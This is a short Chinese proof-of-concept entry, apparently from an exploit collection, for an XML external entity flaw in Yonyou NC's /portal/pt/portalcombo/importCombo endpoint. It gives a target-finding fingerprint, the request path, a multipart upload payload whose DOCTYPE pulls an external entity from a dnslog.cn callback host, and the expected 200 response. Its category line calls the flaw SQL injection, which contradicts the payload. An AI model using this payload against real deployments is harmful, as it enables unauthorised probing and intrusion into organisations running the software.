# 用友NCimportCombo存在XML注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1`

**Payload**
```
------WebKitFormBoundary3LEPfAt3B386AN3f
Content-Disposition: form-data; name="file"; filename="1.png"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://1233.c6pqn1.dnslog.cn/xxe_test">
%remote;]>
<root/>
------WebKitFormBoundary3LEPfAt3B386AN3f--
```
- **响应特征**：200